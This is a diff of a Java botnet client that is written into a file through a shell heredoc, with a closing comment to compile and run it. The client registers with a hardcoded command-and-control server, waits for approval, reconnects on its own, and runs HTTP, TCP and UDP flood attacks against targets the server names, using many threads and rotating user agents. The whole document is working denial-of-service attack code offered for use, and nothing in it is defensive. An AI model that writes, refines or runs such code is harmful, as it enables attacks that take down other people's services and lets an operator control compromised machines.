@@ -1,8 +1,10 @@
+# Create the complete working Java client
+cat > EnhancedBotClient.java << 'EOF'
 import java.io.*;
 import java.net.*;
 import java.util.*;
 import java.util.concurrent.*;
-import java.util.concurrent.atomic.AtomicInteger;  // ADD THIS LINE
+import java.util.concurrent.atomic.AtomicInteger;
 import java.security.*;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
@@ -11,7 +13,6 @@ import org.json.*;
 
 public class EnhancedBotClient {
     
-    // Configuration
     private static final String SERVER_URL = "https://c2-server-io.onrender.com";
     private static final int MAX_RETRY_DELAY = 300;
     
@@ -23,11 +24,9 @@ public class EnhancedBotClient {
     
     private Map<String, Object> specs = new HashMap<>();
     private Map<String, Object> stats = new HashMap<>();
-    
     private List<Map<String, String>> userAgents = new ArrayList<>();
     private List<String> proxies = new ArrayList<>();
-    
-    private ExecutorService threadPool = Executors.newCachedThreadPool();  // ADD THIS LINE
+    private ExecutorService threadPool = Executors.newCachedThreadPool();
     
     public EnhancedBotClient() {
         this.botId = generateBotId();
@@ -37,9 +36,8 @@ public class EnhancedBotClient {
     }
     
     private void initDefaultUserAgents() {
-        userAgents.add(Map.of("agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"));
+        userAgents.add(Map.of("agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"));
         userAgents.add(Map.of("agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"));
-        userAgents.add(Map.of("agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"));
     }
     
     private void initSpecs() {
@@ -67,9 +65,7 @@ public class EnhancedBotClient {
     private String generateBotId() {
         try {
             String uniqueId = System.getProperty("user.name") + 
-                             System.getProperty("os.name") + 
-                             System.getenv("COMPUTERNAME") + 
-                             System.getenv("HOSTNAME");
+                             System.getProperty("os.name");
             MessageDigest md = MessageDigest.getInstance("MD5");
             byte[] hash = md.digest(uniqueId.getBytes());
             StringBuilder hex = new StringBuilder();
@@ -99,14 +95,6 @@ public class EnhancedBotClient {
         System.out.printf("[+] RAM: %sGB\n", specs.get("ram_gb"));
         System.out.printf("[+] OS: %s\n", specs.get("os"));
         System.out.printf("[+] Hostname: %s\n", specs.get("hostname"));
-        
-        System.out.println("\n[*] FEATURES:");
-        System.out.println("    [OK] RESOURCE OPTIMIZED (Server-defined threads)");
-        System.out.println("    [OK] MULTI-THREADED ATTACKS");
-        System.out.println("    [OK] AUTO-RECONNECT ON DISCONNECT");
-        System.out.println("    [OK] CUSTOM USER AGENTS FROM SERVER");
-        System.out.println("    [OK] OPTIONAL PROXY SUPPORT");
-        
         System.out.println("\n" + "=".repeat(60) + "\n");
     }
     
@@ -320,24 +308,11 @@ public class EnhancedBotClient {
             }
         }
         
-        List<String> proxyList = new ArrayList<>();
-        if (cmd.containsKey("proxies")) {
-            Object proxyObj = cmd.get("proxies");
-            if (proxyObj instanceof JSONArray) {
-                JSONArray proxyArray = (JSONArray) proxyObj;
-                for (int i = 0; i < proxyArray.length(); i++) {
-                    proxyList.add(proxyArray.getString(i));
-                }
-            }
-        }
-        
-        System.out.println("[*] OPTIMIZED HTTP FLOOD");
+        System.out.println("[*] HTTP FLOOD");
         System.out.println("    Target: " + target);
         System.out.println("    Method: " + method);
         System.out.println("    Duration: " + duration + "s");
-        System.out.println("    Threads: " + threads + " (Server-defined)");
-        System.out.println("    User Agents: " + userAgentList.size());
-        System.out.println("    Proxies: " + (proxyList.isEmpty() ? "None" : proxyList.size()));
+        System.out.println("    Threads: " + threads);
         
         stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
         sendStatus("running", method + " FLOOD: " + target);
@@ -367,9 +342,6 @@ public class EnhancedBotClient {
                     
                     conn.setRequestMethod(method);
                     conn.setRequestProperty("User-Agent", userAgentList.get(random.nextInt(userAgentList.size())));
-                    conn.setRequestProperty("Accept", "*/*");
-                    conn.setRequestProperty("Connection", "keep-alive");
-                    conn.setRequestProperty("Cache-Control", "no-cache");
                     conn.setConnectTimeout(3000);
                     conn.setReadTimeout(3000);
                     
@@ -377,7 +349,7 @@ public class EnhancedBotClient {
                         conn.connect();
                     } else if (method.equals("POST")) {
                         conn.setDoOutput(true);
-                        String payload = "data=" + "x".repeat(random.nextInt(900) + 100);
+                        String payload = "data=test";
                         try (OutputStream os = conn.getOutputStream()) {
                             os.write(payload.getBytes());
                         }
@@ -404,13 +376,11 @@ public class EnhancedBotClient {
             }
         };
         
-        System.out.println("[+] Launching " + threads + " attack threads...");
+        System.out.println("[+] Launching " + threads + " threads...");
         
         ExecutorService executor = Executors.newFixedThreadPool(threads);
-        List<Future<?>> futures = new ArrayList<>();
-        
         for (int i = 0; i < threads; i++) {
-            futures.add(executor.submit(floodWorker));
+            executor.submit(floodWorker);
         }
         
         long startTime = System.currentTimeMillis();
@@ -436,19 +406,12 @@ public class EnhancedBotClient {
         }
         
         executor.shutdown();
-        try {
-            executor.awaitTermination(5, TimeUnit.SECONDS);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
-        
         activeAttacks.remove(attackId);
         
-        System.out.printf("\n[OK] FLOOD COMPLETE: %,d requests sent!\n", requestCount.get());
+        System.out.printf("\n[OK] FLOOD COMPLETE: %,d requests\n", requestCount.get());
         stats.put("total_requests", ((Integer) stats.get("total_requests")) + requestCount.get());
         stats.put("successful_attacks", ((Integer) stats.get("successful_attacks")) + 1);
-        sendStatus("success", String.format("Flood: %,d req @ %.0f rps", 
-                requestCount.get(), requestCount.get() / (double) duration));
+        sendStatus("success", String.format("Flood: %,d req", requestCount.get()));
     }
     
     private void cmdTcpFlood(Map<String, Object> cmd) {
@@ -467,10 +430,10 @@ public class EnhancedBotClient {
             port = 80;
         }
         
-        System.out.println("[*] OPTIMIZED TCP FLOOD");
+        System.out.println("[*] TCP FLOOD");
         System.out.println("    Target: " + host + ":" + port);
         System.out.println("    Duration: " + duration + "s");
-        System.out.println("    Threads: " + threads + " (Server-defined)");
+        System.out.println("    Threads: " + threads);
         
         stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
         sendStatus("running", "TCP FLOOD: " + host + ":" + port);
@@ -482,19 +445,10 @@ public class EnhancedBotClient {
         
         Runnable tcpWorker = () -> {
             long endTime = System.currentTimeMillis() + (duration * 1000);
-            Random random = new Random();
             
             while (System.currentTimeMillis() < endTime && activeAttacks.contains(attackId)) {
                 try (Socket socket = new Socket()) {
                     socket.connect(new InetSocketAddress(host, port), 1000);
-                    
-                    String payload = "GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n";
-                    socket.getOutputStream().write(payload.getBytes());
-                    
-                    byte[] randomData = new byte[256];
-                    random.nextBytes(randomData);
-                    socket.getOutputStream().write(randomData);
-                    
                     requestCount.incrementAndGet();
                     Thread.sleep(10);
                 } catch (Exception e) {
@@ -510,10 +464,8 @@ public class EnhancedBotClient {
         };
         
         ExecutorService executor = Executors.newFixedThreadPool(threads);
-        List<Future<?>> futures = new ArrayList<>();
-        
         for (int i = 0; i < threads; i++) {
-            futures.add(executor.submit(tcpWorker));
+            executor.submit(tcpWorker);
         }
         
         long startTime = System.currentTimeMillis();
@@ -529,12 +481,6 @@ public class EnhancedBotClient {
         }
         
         executor.shutdown();
-        try {
-            executor.awaitTermination(5, TimeUnit.SECONDS);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
-        
         activeAttacks.remove(attackId);
         
         System.out.printf("\n[OK] TCP flood: %,d connections\n", requestCount.get());
@@ -559,10 +505,10 @@ public class EnhancedBotClient {
             port = 53;
         }
         
-        System.out.println("[*] OPTIMIZED UDP FLOOD");
+        System.out.println("[*] UDP FLOOD");
         System.out.println("    Target: " + host + ":" + port);
         System.out.println("    Duration: " + duration + "s");
-        System.out.println("    Threads: " + threads + " (Server-defined)");
+        System.out.println("    Threads: " + threads);
         
         stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
         sendStatus("running", "UDP FLOOD: " + host + ":" + port);
@@ -581,7 +527,7 @@ public class EnhancedBotClient {
                 
                 while (System.currentTimeMillis() < endTime && activeAttacks.contains(attackId)) {
                     try {
-                        byte[] payload = new byte[random.nextInt(1536) + 512];
+                        byte[] payload = new byte[1024];
                         random.nextBytes(payload);
                         
                         DatagramPacket packet = new DatagramPacket(payload, payload.length, address, port);
@@ -590,7 +536,7 @@ public class EnhancedBotClient {
                         requestCount.incrementAndGet();
                         Thread.sleep(1);
                     } catch (Exception e) {
-                        // Continue on error
+                        // Continue
                     }
                 }
             } catch (Exception e) {
@@ -599,10 +545,8 @@ public class EnhancedBotClient {
         };
         
         ExecutorService executor = Executors.newFixedThreadPool(threads);
-        List<Future<?>> futures = new ArrayList<>();
-        
         for (int i = 0; i < threads; i++) {
-            futures.add(executor.submit(udpWorker));
+            executor.submit(udpWorker);
         }
         
         long startTime = System.currentTimeMillis();
@@ -618,12 +562,6 @@ public class EnhancedBotClient {
         }
         
         executor.shutdown();
-        try {
-            executor.awaitTermination(5, TimeUnit.SECONDS);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
-        
         activeAttacks.remove(attackId);
         
         System.out.printf("\n[OK] UDP flood: %,d packets\n", requestCount.get());
@@ -661,7 +599,7 @@ public class EnhancedBotClient {
                     connectionRetries = 0;
                 }
                 
-                System.out.println("\n[*] Connecting to server: " + SERVER_URL);
+                System.out.println("\n[*] Connecting to server...");
                 System.out.println("[*] Waiting for auto-approval...\n");
                 
                 approved = false;
@@ -679,15 +617,15 @@ public class EnhancedBotClient {
                             System.out.println("=".repeat(60) + "\n");
                             break;
                         } else {
-                            System.out.print("\r[...] Waiting for approval (ID: " + botId + ")...");
+                            System.out.print("\r[...] Waiting for approval...");
                             Thread.sleep(5000);
                         }
                     } catch (IOException e) {
                         connectionRetries++;
                         int delay = calculateRetryDelay();
                         
-                        System.out.println("\n[X] Connection lost: " + e.getMessage());
-                        System.out.println("[...] Retry " + connectionRetries + " - Waiting " + delay + "s before reconnecting...");
+                        System.out.println("\n[X] Connection lost");
+                        System.out.println("[...] Retry " + connectionRetries + " - Waiting " + delay + "s...");
                         
                         for (int remaining = delay; remaining > 0; remaining--) {
                             if (!checkInternetConnection()) {
@@ -727,7 +665,7 @@ public class EnhancedBotClient {
                         connectionRetries++;
                         int delay = calculateRetryDelay();
                         
-                        System.out.println("\n[X] Lost connection to C2 server: " + e.getMessage());
+                        System.out.println("\n[X] Lost connection to server");
                         System.out.println("[...] Retry " + connectionRetries + " - Waiting " + delay + "s...");
                         
                         for (int remaining = delay; remaining > 0; remaining--) {
@@ -777,3 +715,6 @@ public class EnhancedBotClient {
         }
     }
 }
+EOF
+
+# Now compile and run
